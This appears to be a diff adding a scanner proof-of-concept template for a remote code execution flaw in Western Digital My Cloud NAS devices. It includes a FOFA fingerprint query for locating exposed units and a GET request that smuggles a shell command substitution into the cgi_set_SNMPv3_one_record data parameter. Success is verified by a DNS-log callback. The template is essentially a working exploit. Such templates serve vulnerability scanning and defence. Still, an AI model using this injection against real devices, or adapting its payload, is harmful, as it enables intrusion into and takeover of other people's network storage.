@@ -1,0 +1,20 @@
+id: poc-yaml-west-nas-cgi-set-snmpv3-one-record-rce
+info:
+  name: 西部数据 NAS cgi_set_SNMPv3_one_record 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - DNSLOG
+  finger: western_digital_mycloud_nas
+  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"WDMyCloud")
+- method: GET
+  path: /cgi-bin/snmp_mgr.cgi?cmd=cgi_set_SNMPv3_one_record&data=%3Ca%20id=0%3E%3Ccell%3E%24(ping%20{{.domain}})%3C/cell%3E%3C/a%3E&data_len=100
+  expression: status_code == 200 && body == "" && reverse.Verify()
+transport: http
